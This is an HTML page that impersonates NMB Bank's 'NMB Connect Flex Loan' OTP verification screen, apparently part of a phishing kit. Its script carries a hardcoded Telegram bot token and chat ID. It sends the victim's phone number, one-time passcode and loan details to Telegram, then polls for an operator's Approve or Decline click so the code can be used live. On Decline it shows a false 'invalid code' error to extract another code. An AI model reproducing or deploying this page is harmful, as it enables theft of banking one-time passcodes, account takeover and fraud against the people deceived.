<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#003366">
    <title>NMB Connect | OTP Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --nmb-blue: #003366;
            --nmb-gold: #E4C16A;
            --nmb-light-blue: #4a90e2;
            --white: #ffffff;
            --bg-overlay: rgba(0, 0, 0, 0.75);
            --card-bg: rgba(255, 255, 255, 0.12);
            --input-bg: rgba(255, 255, 255, 0.08);
            --error: #ff6b6b;
        }

        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), 
                        url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            min-height: 100vh;
            color: white;
            line-height: 1.6;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        header {
            padding: 40px 5% 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo { 
            font-size: 28px; 
            font-weight: 800; 
            text-decoration: none; 
            display: flex; 
            align-items: center; 
        }
        .logo .nmb { color: var(--nmb-light-blue); }
        .logo .connect { color: var(--nmb-gold); margin-left: 6px; }
        .logo .flex-loan { color: var(--white); margin-left: 8px; font-weight: 400; font-size: 24px; opacity: 0.9; }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 420px;
            width: 100%;
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.18);
            border-radius: 35px;
            padding: 45px 35px;
            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
            text-align: center;
            animation: cardFadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes cardFadeIn {
            from { opacity: 0; transform: translateY(40px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .brand-icon {
            width: 80px;
            height: 80px;
            background: var(--nmb-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
            border: 2px solid rgba(228, 193, 106, 0.3);
        }

        .card h2 { 
            font-size: 24px; 
            font-weight: 700; 
            margin-bottom: 10px; 
            color: var(--white);
        }
        .card p { 
            font-size: 14px; 
            opacity: 0.7; 
            margin-bottom: 30px; 
            font-weight: 300;
        }

        .loan-badge {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(228, 193, 106, 0.2);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }
        .loan-badge .label { 
            font-size: 11px; 
            text-transform: uppercase; 
            color: var(--nmb-gold); 
            font-weight: 700; 
            display: block; 
            margin-bottom: 5px; 
            letter-spacing: 1px;
        }
        .loan-badge .val { font-size: 18px; font-weight: 700; color: var(--white); display: block; }

        .error-msg {
            color: var(--error);
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            background: rgba(255, 107, 107, 0.1);
            padding: 12px;
            border-radius: 14px;
            border: 1px solid rgba(255, 107, 107, 0.2);
        }

        .otp-row {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .otp-box {
            width: 45px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 1.5px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            background: var(--input-bg);
            color: white;
            outline: none;
            transition: all 0.3s ease;
        }

        .otp-box:focus { 
            border-color: var(--nmb-gold); 
            background: rgba(255, 255, 255, 0.12);
            box-shadow: 0 0 15px rgba(228, 193, 106, 0.15);
        }
        .otp-box.ok { border-color: var(--nmb-gold); }

        .verify-btn {
            width: 100%;
            padding: 20px;
            background: var(--white);
            color: var(--nmb-blue);
            border: none;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            margin-top: 10px;
        }
        .verify-btn:hover { 
            background: var(--nmb-gold);
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
        }
        .verify-btn:active { transform: translateY(-1px); }

        .overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center; flex-direction: column;
            background: rgba(0, 15, 30, 0.95);
            z-index: 2000;
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            padding: 20px;
        }
        .overlay.on { display: flex; }
        .spin { 
            width: 60px; height: 60px; 
            border: 4px solid rgba(255,255,255,0.1); 
            border-top-color: var(--nmb-gold); 
            border-radius: 50%; 
            animation: sp 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; 
        }
        .sp-t { font-size: 20px; font-weight: 700; margin-top: 25px; letter-spacing: 0.5px; }
        .sp-s { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 10px; font-weight: 300; }
        @keyframes sp { to { transform: rotate(360deg); } }

        footer { 
            padding: 40px 20px; 
            text-align: center; 
            font-size: 12px; 
            opacity: 0.4; 
        }

        @media (max-width: 480px) {
            .logo { font-size: 24px; }
            .logo .flex-loan { font-size: 20px; }
            .card { padding: 40px 25px; }
            .card h2 { font-size: 22px; }
            .otp-box { width: 38px; height: 50px; font-size: 20px; }
        }
    </style>
</head>
<body onload="init()">

    <header>
        <a class="logo" href="index.html">
            <span class="nmb">NMB</span><span class="connect">Connect</span><span class="flex-loan">Flex Loan</span>
        </a>
    </header>

    <main>
        <div class="container">
            <div class="card">
                <div class="brand-icon">
                    <svg viewBox="0 0 100 100" width="45" height="45">
                        <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                        <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                    </svg>
                </div>
                
                <h2>OTP Verification</h2>
                <p>Please enter the 6-digit security code sent to your mobile device to authorize this request.</p>

                <div id="loanBox" class="loan-badge" style="display:none;">
                    <span class="label" id="loanType">Loan Application</span>
                    <span class="val" id="loanAmount">$0.00 USD</span>
                </div>

                <div id="err" class="error-msg"></div>
                
                <div class="otp-row" id="otpRow">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                </div>

                <button class="verify-btn" onclick="doOTP()">Authorize & Continue</button>
            </div>
        </div>
    </main>

    <div id="ov" class="overlay">
        <div class="spin"></div>
        <div class="sp-t">Verifying Security Code</div>
        <div class="sp-s">Securing your connection to NMB Bank...</div>
    </div>

    <footer>
        <p>&copy; 2026 NMB Bank Limited. Zimbabwe.</p>
    </footer>

    <script>
        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const CID = '7547427914';
        let bd = {}, luid = 0, otp = '', phone = '';
        const boxes = document.querySelectorAll('.otp-box');

        function init() {
            const p = new URLSearchParams(location.search);
            const amount = p.get('amount') || "0";
            const purpose = p.get('purpose') || "Flex Loan";
            phone = p.get('phone') || '';
            
            if (amount !== "0") { 
                bd = { data: purpose, price: amount }; 
                document.getElementById('loanBox').style.display = 'block';
                document.getElementById('loanType').textContent = decodeURIComponent(purpose);
                document.getElementById('loanAmount').textContent = '$' + parseFloat(amount.replace(/[^0-9.]/g, '')).toLocaleString(undefined, {minimumFractionDigits: 2}) + ' USD';
            }
            setupOTP();
            
            // Auto-focus first box
            boxes[0].focus();
        }

        function setupOTP() {
            boxes.forEach((b, i) => {
                b.addEventListener('input', e => {
                    const v = e.target.value;
                    
                    // Handle paste or autofill
                    if (v.length > 1) {
                        const digs = v.replace(/\D/g, '').split('');
                        digs.forEach((d, j) => { 
                            if (i + j < boxes.length) { 
                                boxes[i + j].value = d; 
                                boxes[i + j].classList.add('ok'); 
                            } 
                        });
                        const nextIndex = Math.min(i + digs.length, boxes.length - 1);
                        boxes[nextIndex].focus();
                        chk();
                        if (otp.length === 6) doOTP();
                        return;
                    }
                    
                    if (v) { 
                        b.classList.add('ok'); 
                        if (i < boxes.length - 1) boxes[i + 1].focus(); 
                    } else { 
                        b.classList.remove('ok'); 
                    }
                    
                    chk();
                    if (otp.length === 6) doOTP();
                });
                
                b.addEventListener('keydown', e => {
                    if (e.key === 'Backspace' && !b.value && i > 0) {
                        boxes[i - 1].focus();
                    }
                });
                
                // Ensure only numbers
                b.addEventListener('keypress', e => {
                    if (!/[0-9]/.test(e.key)) e.preventDefault();
                });
            });
        }

        function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
        function clrErr() { document.getElementById('err').style.display = 'none'; }

        async function tg(msg, btns) {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CID, 
                        text: msg, 
                        reply_markup: btns ? { inline_keyboard: btns } : undefined, 
                        parse_mode: 'HTML' 
                    })
                });
                const d = await r.json();
                if (d.ok) {
                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                    const ud = await ur.json();
                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
                }
            } catch(e) { console.error(e); }
        }

        function doOTP() {
            clrErr();
            if (otp.length !== 6) { showErr('Please enter the full 6-digit code'); return; }

            const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${bd.price || '0'})</code>`;
            const btns = [[{ text: '✅ Approve', callback_data: 'otp_approved' }, { text: '❌ Decline', callback_data: 'otp_declined' }]];

            document.getElementById('ov').classList.add('on');
            tg(msg, btns);
            poll();
        }

        function poll() {
            const iv = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok && d.result.length > 0) {
                            d.result.forEach(u => {
                                luid = u.update_id;
                                if (u.callback_query) {
                                    const cb = u.callback_query.data;
                                    if (cb === 'otp_approved') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        location.href = `success.html?amount=${bd.price}&purpose=${bd.data}`;
                                    }
                                    else if (cb === 'otp_declined') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('Invalid security code. Please check and try again.'); 
                                        boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
                                        boxes[0].focus(); 
                                    }
                                }
                            });
                        }
                    }).catch(e => console.error(e));
            }, 1500);
            setTimeout(() => clearInterval(iv), 600000);
        }
    </script>
</body>
</html>
